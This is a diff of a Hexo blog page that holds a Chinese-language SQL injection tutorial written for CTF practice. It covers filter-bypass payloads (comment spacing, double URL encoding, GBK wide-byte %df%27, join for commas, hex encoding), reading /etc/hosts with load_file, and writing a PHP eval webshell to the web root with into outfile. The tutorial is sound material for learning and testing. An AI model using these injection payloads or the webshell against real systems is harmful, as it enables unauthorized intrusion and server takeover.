@@ -29,7 +29,7 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 5.4.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 <link rel="alternate" href="/atom.xml" title="Ex1t" type="application/atom+xml">
 </head>
@@ -593,6 +593,7 @@ database <span class="token operator">=</span> <span class="token string">''</sp
            <span class="token keyword">else</span><span class="token punctuation">:</span>
               <span class="token keyword">pass</span>
 <span class="token keyword">print</span> <span class="token string">'database is '</span> <span class="token operator">+</span> database<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h5 id="1-3-5-二次注入"><a href="#1-3-5-二次注入" class="headerlink" title="1.3.5 二次注入"></a>1.3.5 二次注入</h5><p>二次注入是因为数据在第一次进入数据库的时候进行了过滤和转义<br>当这条数据从数据取出来在sql语句中进行拼接，而这次拼接中没有过滤<br>一般比较难发现，所以比赛中很难发现，一般CTF出题人会给源码，或者提示<br>二次注入也一般不是单纯的二次注入，通常还有报错注入或bool盲注，要写脚本模拟</p>
 <h4 id="2、找到漏洞"><a href="#2、找到漏洞" class="headerlink" title="2、找到漏洞"></a>2、找到漏洞</h4><p>再谈一谈怎么发现注入点<br>常见的注入点位置有</p>
 <ol>
@@ -652,10 +653,14 @@ database <span class="token operator">=</span> <span class="token string">''</sp
 </ul>
 <p>可以通过注释符来绕过空格</p>
 <pre class="line-numbers language-none"><code class="language-none">select/**/name/**/from/**/user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h6 id="3-2-2-通过URL编码绕过，我们知道空格-20，所以可以通过二次URL编码进行绕过"><a href="#3-2-2-通过URL编码绕过，我们知道空格-20，所以可以通过二次URL编码进行绕过" class="headerlink" title="3.2.2 通过URL编码绕过，我们知道空格%20，所以可以通过二次URL编码进行绕过"></a>3.2.2 通过URL编码绕过，我们知道空格%20，所以可以通过二次URL编码进行绕过</h6><pre class="line-numbers language-none"><code class="language-none">%20 --&gt; %2520<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h6 id="3-2-3-通过空白字符绕过，各个数据库都有一些空白字符"><a href="#3-2-3-通过空白字符绕过，各个数据库都有一些空白字符" class="headerlink" title="3.2.3 通过空白字符绕过，各个数据库都有一些空白字符"></a>3.2.3 通过空白字符绕过，各个数据库都有一些空白字符</h6><pre class="line-numbers language-none"><code class="language-none">MySQL5--09,0A,0B,0C,0D,A0,20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h6 id="3-2-4-通过特殊字符（如括号，反引号等）"><a href="#3-2-4-通过特殊字符（如括号，反引号等）" class="headerlink" title="3.2.4 通过特殊字符（如括号，反引号等）"></a>3.2.4 通过特殊字符（如括号，反引号等）</h6><pre><code>select(user())</code></pre>
 <h6 id="3-2-5-科学计数法绕过"><a href="#3-2-5-科学计数法绕过" class="headerlink" title="3.2.5 科学计数法绕过"></a>3.2.5 科学计数法绕过</h6><pre class="line-numbers language-none"><code class="language-none">select user,password from users where user_id=0e1union select 1,2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h5 id="3-3-过滤单引号"><a href="#3-3-过滤单引号" class="headerlink" title="3.3 过滤单引号"></a>3.3 过滤单引号</h5><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为\ ' 。</p>
 <pre><code>id=-1%df%27union select 1,user(),3--+</code></pre>
 <p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p>
@@ -666,6 +671,7 @@ database <span class="token operator">=</span> <span class="token string">''</sp
 <pre class="line-numbers language-none"><code class="language-none">%df%27=====(addslashes)======&gt;%df%5c%27======(GBK)======&gt;運’
 
 id=-1%df%27union select 1,user(),3--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <h5 id="3-4-过滤等号"><a href="#3-4-过滤等号" class="headerlink" title="3.4 过滤等号"></a>3.4 过滤等号</h5><p>使用like 、rlike 、regexp 或者 使用比较符（）</p>
 <h5 id="3-5-过滤逗号"><a href="#3-5-过滤逗号" class="headerlink" title="3.5 过滤逗号"></a>3.5 过滤逗号</h5><p>可以使用join方法绕过</p>
 <pre class="line-numbers language-none"><code class="language-none">	union select 1,2,3 
@@ -673,10 +679,13 @@ id=-1%df%27union select 1,user(),3--+<span aria-hidden="true" class="line-number
 join语句： 
 
 	union select * from (select 1)a join (select 2)b join (select 3) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h5 id="3-6-过滤比较符（）"><a href="#3-6-过滤比较符（）" class="headerlink" title="3.6 过滤比较符（）"></a>3.6 过滤比较符（）</h5><p>使用greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
 <h5 id="3-7-过滤注释符（-–）"><a href="#3-7-过滤注释符（-–）" class="headerlink" title="3.7 过滤注释符（#,–）"></a>3.7 过滤注释符（#,–）</h5><pre class="line-numbers language-none"><code class="language-none">id=1' union select 1,2,3||'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p>
 <pre class="line-numbers language-none"><code class="language-none">id=1' union select 1,2,'3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>3.8 进行编码绕过</p>
 <p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
 <pre class="line-numbers language-none"><code class="language-none">or 1=1
@@ -684,18 +693,23 @@ join语句：
 %6f%72%20%31%3d%31
 
 CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h4 id="4-SQL读写文件"><a href="#4-SQL读写文件" class="headerlink" title="4 SQL读写文件"></a>4 SQL读写文件</h4><p>在了解SQL注入的原理、方法、过滤之后</p>
 <p>继续学习一下SQL读写文件</p>
 <p>CTF中有的flag在文件中，但是存在SQL注入，渗透过程中，你也可以写入木马文件</p>
 <p>在具有file权限的情况下，使用load_file和into  outfile/dumpfile进行读写</p>
 <p>读取文件</p>
 <pre class="line-numbers language-none"><code class="language-none">?id=-1+union+select+load_file('/etc/hosts')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>在某些绕过单引号的情况下，可以使用文件名的十六进制来作为load_file函数的参数</p>
 <pre class="line-numbers language-none"><code class="language-none">?id=-1+union+select+load_file(0x2f6574632f686f737473)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>也可以通过sql写文件</p>
 <pre class="line-numbers language-none"><code class="language-none">?id=-1+union+select+’&lt;?php eval($_POST[-7]);&gt;‘+into+outfile'/var/www/html/shell.php'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>或</p>
 <pre class="line-numbers language-none"><code class="language-none">?id=-1+union+select+unhex(一句话shell的十六进制)+into+dumpfile'/var/www/html/shell.php'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>值得注意的是，除了要有写文件的权限，文件名不能是已存在的.</p>
 <h4 id="5-总结"><a href="#5-总结" class="headerlink" title="5 总结"></a>5 总结</h4><p>就此关于SQL注入的总结已经完成了，最近在看CTF特训营，顿时发觉自己学的还很浅，于是觉得该好好的总结一次。除了CTF特训营上的内容，还有以前浏览网上各大博主发表的wp、总结等所记录的笔记，学会了很多。如果本文存在错误或有其他问题以及还存在补充，敬请指正。</p>
 
